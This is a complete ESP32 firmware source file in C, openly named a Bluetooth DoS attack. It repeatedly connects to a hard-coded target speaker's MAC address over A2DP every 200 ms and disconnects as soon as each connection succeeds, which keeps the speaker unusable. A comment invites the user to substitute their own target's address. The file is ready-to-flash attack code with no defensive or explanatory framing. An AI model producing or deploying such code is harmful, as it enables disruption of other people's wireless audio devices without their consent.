#include "nvs_flash.h"
#include "esp_bt.h"
#include "esp_log.h"
#include "esp_bt_main.h"
#include "esp_bt_device.h"
#include "esp_gap_bt_api.h"
#include "esp_a2dp_api.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>

static const char *TAG = "BT_DOS_ATTACK";

// Replace with your target speaker MAC address
static const esp_bd_addr_t target_bda = {0xf4, 0x4e, 0xfd, 0x03, 0xa6, 0xdc};

// Optional: count how many connect/disconnect cycles occurred
static int connect_attempts = 0;
static int disconnects = 0;

static void bt_app_a2d_cb(esp_a2d_cb_event_t event, esp_a2d_cb_param_t *param) {
    if (event == ESP_A2D_CONNECTION_STATE_EVT) {
        ESP_LOGI(TAG, "A2DP state: %d", param->conn_stat.state);
        if (param->conn_stat.state == ESP_A2D_CONNECTION_STATE_CONNECTED) {
            ESP_LOGI(TAG, "Disconnecting immediately (DoS cycle #%d)", ++disconnects);
            esp_a2d_source_disconnect(param->conn_stat.remote_bda);
        }
    }
}

void attack_task(void *arg) {
    while (true) {
        ESP_LOGI(TAG, "[Attempt %d] Connecting to target speaker...", ++connect_attempts);
        esp_err_t err = esp_a2d_source_connect(target_bda);
        if (err != ESP_OK) {
            ESP_LOGW(TAG, "Connection attempt failed (error %d), retrying...", err);
        }
        vTaskDelay(pdMS_TO_TICKS(200)); // Faster attack interval: 200 ms
    }
}

void app_main(void) {
    ESP_ERROR_CHECK(nvs_flash_init());

    ESP_ERROR_CHECK(esp_bt_controller_mem_release(ESP_BT_MODE_BLE));
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_bt_controller_init(&bt_cfg));
    ESP_ERROR_CHECK(esp_bt_controller_enable(ESP_BT_MODE_CLASSIC_BT));

    ESP_ERROR_CHECK(esp_bluedroid_init());
    ESP_ERROR_CHECK(esp_bluedroid_enable());

    ESP_ERROR_CHECK(esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_GENERAL_DISCOVERABLE));
    ESP_ERROR_CHECK(esp_bt_dev_set_device_name("ESP32_DOS_ATTACKER"));

    ESP_ERROR_CHECK(esp_a2d_register_callback(bt_app_a2d_cb));
    ESP_ERROR_CHECK(esp_a2d_source_init());

    xTaskCreate(attack_task, "attack_task", 4096, NULL, 5, NULL);
}
